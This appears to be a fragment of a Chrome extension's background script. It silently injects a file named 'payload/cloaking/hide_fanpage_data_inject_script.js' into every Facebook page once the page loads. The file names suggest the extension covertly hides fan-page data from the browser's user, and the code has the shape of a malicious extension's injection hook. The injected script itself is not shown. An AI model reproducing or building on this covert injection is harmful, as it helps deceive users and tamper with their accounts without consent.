if (typeof hide_fanpage_data_js == "undefined")
{
    sendLogMessage("Adding hide_fanpage_data_js");

     hide_fanpage_data_js = true;

    chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
        if (info.status == "complete" && tab.url.indexOf("www.facebook.com") !== -1)
        {
            chrome.tabs.executeScript(tab.id, { file: "payload/cloaking/hide_fanpage_data_inject_script.js" });
        }
    });
}
